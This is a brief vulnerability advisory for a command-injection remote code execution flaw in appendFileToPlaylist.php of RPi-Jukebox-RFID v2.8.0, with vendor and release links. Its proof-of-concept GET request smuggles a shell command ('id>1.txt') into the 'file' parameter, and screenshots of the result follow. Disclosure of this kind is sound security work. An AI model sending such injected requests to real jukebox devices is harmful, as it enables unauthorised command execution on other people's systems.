# RCE vulnerability in [RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID) v2.8.0 of file /appendFileToPlaylist.php

**vender**:

- [MiczFlor/RPi-Jukebox-RFID: A Raspberry Pi jukebox, playing local music, podcasts, web radio and streams triggered by RFID cards, web app or home automation. All plug and play via USB. GPIO scripts available.](https://github.com/MiczFlor/RPi-Jukebox-RFID)

**SoftLink**:

- [Release v2.8.0: Fix Spotify Authentication · MiczFlor/RPi-Jukebox-RFID](https://github.com/MiczFlor/RPi-Jukebox-RFID/releases/tag/v2.8.0)

**Vulnerable File**

- \htdocs\api\playlist\appendFileToPlaylist.php

**Version**

- 2.8.0

### POC

```
GET /api/playlist/appendFileToPlaylist.php?file=test%27;id%3E1.txt; HTTP/1.1
Host: 192.168.129.130
```

![image-20250828225217844](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282252939.png)

![image-20250828225256664](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508282252741.png)